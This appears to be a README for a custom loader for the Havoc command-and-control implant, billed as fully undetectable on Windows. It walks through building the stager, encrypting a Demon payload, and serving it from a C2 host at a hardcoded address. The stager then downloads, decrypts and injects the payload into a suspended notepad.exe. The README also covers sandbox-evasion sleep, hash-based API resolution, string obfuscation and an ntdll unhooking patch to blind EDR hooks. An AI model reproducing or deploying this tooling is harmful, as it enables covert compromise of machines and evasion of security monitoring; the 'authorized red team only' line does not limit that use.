# Custom Havoc Stager — Windows FUD Loader

A minimal, position-independent stager for Havoc Demon that emphasizes **low detection** through:

- **PEB walking** — zero imports table, all APIs resolved at runtime by hash
- **WinHTTP** — blends with legitimate Windows Update / Edge traffic
- **AES-256-CTR** — payload encryption with random per-run IV
- **Section Mapping Injection** — avoids `VirtualAllocEx` / `WriteProcessMemory` / `CreateRemoteThread`
- **Jittered sleep** — 15–45 second sandbox evasion delay before any C2 activity

## Repository Layout

```
havoc-stager/
├── src/
│   ├── stager.h      # Config, typedefs, prototypes
│   ├── stager.c      # Main entry: sleep → download → decrypt → inject
│   ├── peb.c         # PEB walking + hash-based API resolution
│   ├── crypto.c      # Compact AES-256-CTR implementation
│   └── inject.c      # NtCreateSection + NtMapViewOfSection injection
├── cmd/encrypt/
│   └── main.go       # Go utility: encrypt Havoc payload for stager
├── bin/              # Build output (stager.exe)
├── obj/              # Object files
└── Makefile
```

## Quick Start

### 1. Build the Stager

```bash
cd havoc-stager
make
```

Output: `bin/stager.exe` (~7.5 KB stripped PE32+)

### 2. Generate Havoc Payload

In Havoc, generate a raw x64 Demon payload:

```
Payload → Generate → Windows x64 → Raw
Save as: payload.bin
```

### 3. Encrypt the Payload

```bash
cd havoc-stager
go run cmd/encrypt/main.go -in payload.bin -out payload.enc
```

This prints a 64-character hex key. Embed this key in `src/stager.c`:

```c
static BYTE cfg_key[32] = {
    0xAB, 0xCD, 0xEF, ...  // 32 bytes from encryptor output
};
```

Rebuild: `make`

### 4. Serve the Encrypted Payload

```bash
# Simple Python HTTP server on C2 host
python3 -m http.server 8443
# Or use the Havoc teamserver with a custom handler
```

Place `payload.enc` at the URL configured in `src/stager.c` (default: `http://192.168.1.165:8443/payload`).

### 5. Deploy

Run `stager.exe` on the target. It will:

1. Sleep 15–45 seconds (sandbox evasion)
2. Resolve all APIs via PEB walking
3. Download `payload.enc` via WinHTTP
4. Decrypt with AES-256-CTR
5. Spawn `notepad.exe` suspended
6. Create an executable section, map into local + remote process
7. Execute Demon in the sacrificial process
8. Wipe decrypted payload from memory and exit cleanly

## Evasion Features

| Technique | File | Purpose |
|-----------|------|---------|
| PEB Walking | `peb.c` | No imports table; APIs resolved by FNV-1a hash |
| String XOR | `stager.c` | C2 host, path, UA obfuscated at compile time |
| Jitter Sleep | `inject.c` | Random delay before C2 activity |
| Memory Wipe | `stager.c` | Overwrite buffers with zeros before free |
| Section Injection | `inject.c` | Avoids hooked `WriteProcessMemory` |
| AES-256-CTR | `crypto.c` | Encrypts payload in transit |

## Demon Patches (Optional Hardening)

The `havoc-patches/` directory contains an **ntdll unhooking** patch:

- **`unhook.c`** — Remaps clean `ntdll.dll` from `\KnownDlls`, overwriting EDR hooks
- **`MainExe.c`** — Patched entry point that calls `UnhookNtdll()` before `DemonMain()`

To apply:

```bash
cp havoc-patches/unhook.c Havoc/payloads/Demon/src/core/
cp havoc-patches/MainExe.c Havoc/payloads/Demon/src/main/
# Rebuild Demon in Havoc client
```

## Detection Considerations

**What this defeats:**
- Signature-based AV scanning (tiny stager, no strings, no imports)
- Userland API hooks on `VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread`
- Static analysis of C2 configuration (encrypted strings)
- Sandbox time-analysis (jittered sleep)

**What still sees it:**
- Kernel callbacks (ETW, process creation events, network connections)
- Behavioral ML models trained on WinHTTP + section mapping sequences
- Memory forensics after injection (Demon is still in notepad.exe memory)

## Build Requirements

- Kali Linux (or any Linux with mingw-w64)
- `x86_64-w64-mingw32-gcc`
- Go 1.22+ (for encryptor utility)

## Size Comparison

| Component | Size |
|-----------|------|
| Stager (stripped) | ~7.5 KB |
| Havoc Demon (raw) | ~50–100 KB |
| Encrypted payload | Demon size + 16 bytes |

## License

For authorized red team operations and security research only.
